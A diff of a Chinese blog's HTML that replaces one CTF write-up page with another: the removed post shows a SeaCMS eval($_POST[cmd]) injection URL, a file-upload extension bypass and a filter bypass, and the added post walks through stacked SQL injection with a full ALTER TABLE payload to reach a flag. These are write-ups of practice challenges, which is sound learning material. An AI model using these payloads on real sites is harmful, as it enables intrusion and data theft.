@@ -47,27 +47,18 @@
   };
 </script>
 
-  <meta name="description" content="“百度杯”CTF比赛-九月场 Writeup一 : Test​    海洋cms，goolge查找以前的漏洞1&#x2F;search.php?searchtype=5&amp;amp;tid=&amp;amp;area=eval($_POST[cmd])找到数据库配置文件进入数据库找到flag二 :  123​    f12看源码，提示用户信息在user.php,想到备份泄露，尝试user.php.bak得到文件">
+  <meta name="description" content="[强网杯 2019]随便注 1‘ &#x2F;&#x2F;首先尝试的加引号，报错了1’ # &#x2F;&#x2F;正常1‘ order by 1 # &#x2F;&#x2F;用order by 测试得到列数为21’ union select 1,2 # &#x2F;&#x2F;回显了过滤规则 return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);">
 <meta name="keywords" content="Writeup,web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“百度杯”CTF比赛 九月场">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;index.html">
+<meta property="og:title" content="[强网杯 2019]随便注">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;13&#x2F;%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;index.html">
 <meta property="og:site_name" content="NoObject&#39;s blog">
-<meta property="og:description" content="“百度杯”CTF比赛-九月场 Writeup一 : Test​    海洋cms，goolge查找以前的漏洞1&#x2F;search.php?searchtype=5&amp;amp;tid=&amp;amp;area=eval($_POST[cmd])找到数据库配置文件进入数据库找到flag二 :  123​    f12看源码，提示用户信息在user.php,想到备份泄露，尝试user.php.bak得到文件">
+<meta property="og:description" content="[强网杯 2019]随便注 1‘ &#x2F;&#x2F;首先尝试的加引号，报错了1’ # &#x2F;&#x2F;正常1‘ order by 1 # &#x2F;&#x2F;用order by 测试得到列数为21’ union select 1,2 # &#x2F;&#x2F;回显了过滤规则 return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;2.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;3.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;5.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;6.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;7.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;8.png">
-<meta property="og:updated_time" content="2019-12-02T15:59:06.350Z">
+<meta property="og:updated_time" content="2019-12-13T08:43:43.793Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA&#x2F;1.png">
 
-<link rel="canonical" href="http://yoursite.com/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/">
+<link rel="canonical" href="http://yoursite.com/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
 
 
 <script id="page-configurations">
@@ -81,7 +72,7 @@
   };
 </script>
 
-  <title>“百度杯”CTF比赛 九月场 | NoObject's blog</title>
+  <title>[强网杯 2019]随便注 | NoObject's blog</title>
   
 
 
@@ -196,7 +187,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/jieni.gif">
@@ -209,7 +200,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          “百度杯”CTF比赛 九月场
+          [强网杯 2019]随便注
         </h1>
 
         <div class="post-meta">
@@ -220,7 +211,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2019-12-02 23:15:18 / 修改时间：23:59:06" itemprop="dateCreated datePublished" datetime="2019-12-02T23:15:18+08:00">2019-12-02</time>
+              <time title="创建时间：2019-12-13 16:34:14 / 修改时间：16:43:43" itemprop="dateCreated datePublished" datetime="2019-12-13T16:34:14+08:00">2019-12-13</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -250,8 +241,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/" itemprop="commentCount"></span>
+    <a title="valine" href="/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -266,33 +257,45 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="“百度杯”CTF比赛-九月场-Writeup"><a href="#“百度杯”CTF比赛-九月场-Writeup" class="headerlink" title="“百度杯”CTF比赛-九月场 Writeup"></a>“百度杯”CTF比赛-九月场 Writeup</h1><h2 id="一-Test"><a href="#一-Test" class="headerlink" title="一 : Test"></a>一 : Test</h2><p>​    海洋cms，<img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/1.png" alt></p><p>goolge查找以前的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</span><br></pre></td></tr></table></figure><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/2.png" alt></p><p>找到数据库配置文件</p><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/3.png" alt></p><p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/4.png" alt></p><p>进入数据库找到flag</p><h2 id="二-123"><a href="#二-123" class="headerlink" title="二 :  123"></a>二 :  123</h2><p>​    f12看源码，提示用户信息在user.php,想到备份泄露，尝试user.php.bak得到文件</p><a id="more"></a>
-
-
-
-
-
-
-
-
-
-<p>然后进行bp爆破，用攻城锤模式</p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/5.png" alt></p>
-<p>每次爆破改年份，最后是1990</p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/6.png" alt></p>
-<p>用lixiuyun登录，f12看源码</p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/7.png" alt></p>
-<p>f12把注释去掉，进行文件上传，发现不能包含php，用php别名</p>
+        <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
+<p>1‘ //首先尝试的加引号，报错了<br>1’ # //正常<br>1‘ order by 1 # //用order by 测试得到列数为2<br>1’ union select 1,2 # //回显了过滤规则 return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
+</blockquote><a id="more"></a>
+<p>看writeup 要用<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">堆叠注入</a>。。</p>
 <blockquote>
-<p>php2, php3, php4, php5, phps, pht, phtm, phtml</p>
+<p>1’;show databases; #</p>
 </blockquote>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/8.png" alt></p>
-<p>改成1.jpg.phtml成功</p>
-<p>然后访问<code>view.php</code></p>
-<p>直接<code>view.php?file=flag</code>，结果为<code>filter &quot;flag&quot;</code></p>
-<p>`双写绕过 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?file=flflagag</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>1’;show tables; # 发现两个表1919810931114514、words</p>
+</blockquote>
+<p>依次查询两张表的字段</p>
+<blockquote>
+<p>1’; show columns from 表名; #</p>
+</blockquote>
+<p>不过有点问题，只有words有回显。(翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)</p>
+<p>内部查询语句类似 : select id, data from words where id =</p>
+<p>(这里从上面的对words列的查询可以看到它是有两列，id和data)</p>
+<p>然后1919810931114514只有一个flag字段</p>
+<p>这时候虽然有强大的正则过滤，但没有过滤alert和rename关键字</p>
+<p>这时候我们就可以已下面的骚姿势进行注入：</p>
+<blockquote>
+<p>1.将words表改名为word1或其它任意名字</p>
+</blockquote>
+<blockquote>
+<p>2.1919810931114514改名为words</p>
+</blockquote>
+<blockquote>
+<p>3.将新的word表插入一列，列名为id</p>
+</blockquote>
+<blockquote>
+<p>4.将flag列改名为data</p>
+</blockquote>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&apos;;alter table words rename to word;alter table`1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10) default 1 --+</span><br></pre></td></tr></table></figure>
 
+<p>接着我们再用1’ or 1=1 #,查询就得到flag</p>
+<blockquote>
+<p>注：这里要注意几个问题：<br>•    对表名为纯数字的表进行操作时，要在前后加上`符号。由于刚开始不知道，在这卡了一段时间。<br>•    对列名进行更改时，要在后面指定修改后的数据类型<br>•    添加id列时，设置默认值，方便后面查询（1’ or 1=1也可）</p>
+</blockquote>
 
     </div>
 
@@ -324,12 +327,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/" rel="prev" title="“百度杯”CTF比赛 2017 二月场">
-      <i class="fa fa-chevron-left"></i> “百度杯”CTF比赛 2017 二月场
+    <a href="/2019/12/13/HCTF2018-warmup-writeup/" rel="prev" title="HCTF2018-warmup-writeup">
+      <i class="fa fa-chevron-left"></i> HCTF2018-warmup-writeup
     </a></div>
       <div class="post-nav-item">
-    <a href="/2019/12/13/HCTF2018-warmup-writeup/" rel="next" title="HCTF2018-warmup-writeup">
-      HCTF2018-warmup-writeup <i class="fa fa-chevron-right"></i>
+    <a href="/2019/12/13/easy-tornado/" rel="next" title="easy_tornado">
+      easy_tornado <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -369,7 +372,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#“百度杯”CTF比赛-九月场-Writeup"><span class="nav-number">1.</span> <span class="nav-text">“百度杯”CTF比赛-九月场 Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-Test"><span class="nav-number">1.1.</span> <span class="nav-text">一 : Test</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-123"><span class="nav-number">1.2.</span> <span class="nav-text">二 :  123</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">1.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
